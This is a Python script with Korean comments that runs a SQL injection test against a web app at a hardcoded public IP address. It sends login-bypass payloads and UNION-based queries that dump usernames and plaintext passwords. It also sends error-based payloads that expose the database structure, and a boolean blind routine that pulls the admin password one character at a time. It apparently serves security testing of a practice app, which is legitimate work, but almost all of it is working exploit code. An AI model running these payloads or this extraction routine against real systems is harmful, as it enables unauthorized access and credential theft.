import requests
import time
from datetime import datetime


def sqli_check(base_url):
    result = {
        "scan_id": "SQLi",
        "target": base_url,
        "scan_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "vulnerabilities": []
    }

    # ──────────────────────────────────────────
    # SQLi-001: 로그인 우회 (다양한 기법)
    # ──────────────────────────────────────────
    login_payloads = [
        {"username": "' OR '1'='1", "password": "' OR '1'='1"},
        {"username": "admin'--",    "password": "anything"},
        {"username": "' OR 1=1--",  "password": "anything"},
        {"username": "') OR ('1'='1", "password": "anything"},
        {"username": "' OR 'x'='x", "password": "' OR 'x'='x"},
        {"username": "admin' #",    "password": "anything"},
    ]

    for payload in login_payloads:
        resp = requests.post(f"{base_url}/auth/login", json=payload)
        if resp.status_code == 200 and "access_token" in resp.text:
            result["vulnerabilities"].append({
                "id": "SQLI-001",
                "type": "SQL Injection",
                "severity": "Critical",
                "status": "취약",
                "owasp": "A03:2021 - Injection",
                "endpoint": "/auth/login",
                "payload": f"username={payload['username']}",
                "detected_keywords": ["access_token"],
                "evidence": f"페이로드로 인증 우회 후 JWT 토큰 발급 성공",
                "description": "로그인 입력값 SQL 직접 삽입 — 인증 우회로 임의 계정 접근 가능"
            })
            break

    # 이후 테스트용 정상 토큰 발급
    token = None
    login_resp = requests.post(f"{base_url}/auth/login", json={
        "username": "alice", "password": "alice1234"
    })
    if login_resp.status_code == 200:
        token = login_resp.json()["access_token"]

    if not token:
        return result

    headers = {"Authorization": f"Bearer {token}"}

    # ──────────────────────────────────────────
    # SQLi-002: UNION based - users 테이블 비밀번호 탈취
    # ──────────────────────────────────────────
    union_payloads = [
        "' UNION SELECT id,username,password,email,role,created_at FROM users--",
        "' UNION SELECT null,username,password,null,null,null FROM users--",
        "' UNION SELECT 1,username,password,4,5,6 FROM users--",
    ]

    for payload in union_payloads:
        resp = requests.get(f"{base_url}/accounts/search",
            params={"q": payload}, headers=headers)

        if resp.status_code == 200:
            data = resp.json()
            # 응답에 password 필드가 있는지 확인
            has_pw = any("password" in str(row) or "alice1234" in str(row)
                        for row in data)

            if data and has_pw:
                result["vulnerabilities"].append({
                    "id": "SQLI-002",
                    "type": "SQL Injection",
                    "severity": "Critical",
                    "status": "취약",
                    "owasp": "A03:2021 - Injection",
                    "endpoint": "/accounts/search",
                    "payload": payload,
                    "detected_keywords": ["password", "username"],
                    "evidence": f"UNION 공격으로 users 테이블 {len(data)}건 탈취 — 평문 비밀번호 포함",
                    "description": "UNION 기반 SQLi — users 테이블 전체 덤프 가능, 평문 비밀번호 노출"
                })
                break
        elif resp.status_code == 400:
            # 컬럼 수 맞지 않을 때 에러 응답으로 DB 정보 노출
            if "sqlite" in resp.text.lower() or "syntax" in resp.text.lower():
                result["vulnerabilities"].append({
                    "id": "SQLI-002",
                    "type": "SQL Injection",
                    "severity": "High",
                    "status": "취약",
                    "owasp": "A03:2021 - Injection",
                    "endpoint": "/accounts/search",
                    "payload": payload,
                    "detected_keywords": ["sqlite", "syntax"],
                    "evidence": f"에러 응답에 DB 정보 노출: {resp.text[:150]}",
                    "description": "UNION 기반 SQLi 시도 중 에러 메시지로 DB 엔진(SQLite) 및 쿼리 구조 노출"
                })
                break

    # ──────────────────────────────────────────
    # SQLi-003: Error based - DB 구조 파악
    # ──────────────────────────────────────────
    error_payloads = [
        "' AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables))--",
        "' AND extractvalue(1, concat(0x7e, (SELECT name FROM sqlite_master WHERE type='table' LIMIT 1)))--",
        "' AND 1=1 UNION SELECT name,sql,3,4,5,6 FROM sqlite_master WHERE type='table'--",
        "''",  # 단순 quote로 syntax error 유발
    ]

    for payload in error_payloads:
        resp = requests.get(f"{base_url}/accounts/search",
            params={"q": payload}, headers=headers)

        error_keywords = ["sqlite", "syntax error", "SQL", "table", "column"]
        found = [kw for kw in error_keywords if kw.lower() in resp.text.lower()]

        if found and resp.status_code == 400:
            result["vulnerabilities"].append({
                "id": "SQLI-003",
                "type": "SQL Injection",
                "severity": "High",
                "status": "취약",
                "owasp": "A03:2021 - Injection",
                "endpoint": "/accounts/search",
                "payload": payload,
                "detected_keywords": found,
                "evidence": f"에러 메시지로 DB 구조 노출: {resp.text[:200]}",
                "description": "Error based SQLi — 에러 메시지에 DB 엔진, 테이블 구조 등 내부 정보 노출"
            })
            break

    # ──────────────────────────────────────────
    # SQLi-004: Blind SQLi - Boolean based
    # ──────────────────────────────────────────
    # 참 조건 vs 거짓 조건 응답 비교
    true_payload  = "110-2024-000001' AND '1'='1"   # 참
    false_payload = "110-2024-000001' AND '1'='2"   # 거짓

    resp_true  = requests.get(f"{base_url}/accounts/search",
        params={"q": true_payload},  headers=headers)
    resp_false = requests.get(f"{base_url}/accounts/search",
        params={"q": false_payload}, headers=headers)

    true_count  = len(resp_true.json())  if resp_true.status_code  == 200 else 0
    false_count = len(resp_false.json()) if resp_false.status_code == 200 else 0

    if true_count != false_count:
        # Boolean 조건에 따라 응답 다름 → Blind SQLi 가능
        # 실제로 admin 비밀번호 첫 글자 추출 시도
        extracted = ""
        for pos in range(1, 6):
            for char in "abcdefghijklmnopqrstuvwxyz0123456789_":
                blind_payload = f"' OR (SELECT SUBSTR(password,{pos},1) FROM users WHERE username='admin')='{char}'--"
                resp = requests.get(f"{base_url}/accounts/search",
                    params={"q": blind_payload}, headers=headers)
                if resp.status_code == 200 and len(resp.json()) > 0:
                    extracted += char
                    break
            time.sleep(0.05)

        result["vulnerabilities"].append({
            "id": "SQLI-004",
            "type": "SQL Injection",
            "severity": "High",
            "status": "취약",
            "owasp": "A03:2021 - Injection",
            "endpoint": "/accounts/search",
            "payload": f"Boolean 조건 참/거짓 응답 차이 이용",
            "detected_keywords": ["boolean", "blind"],
            "evidence": f"참 조건 응답 {true_count}건 / 거짓 조건 응답 {false_count}건 — admin 비밀번호 앞 5자리 추출: '{extracted}...'",
            "description": "Boolean based Blind SQLi — 응답 차이로 DB 데이터 한 글자씩 추출 가능"
        })

    return result


if __name__ == "__main__":
    import json
    result = sqli_check("http://52.79.242.217:8000")
    print(json.dumps(result, ensure_ascii=False, indent=2))